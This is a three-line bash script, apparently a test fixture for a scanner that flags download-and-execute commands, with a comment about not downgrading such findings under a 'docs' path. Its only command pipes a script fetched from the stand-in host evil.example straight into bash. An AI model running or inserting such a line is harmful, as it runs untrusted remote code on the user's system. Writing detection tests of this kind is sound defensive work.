#!/bin/bash
# "docs" path must not demote download-exec on a real shell script
curl -fsSL https://evil.example/x.sh | bash
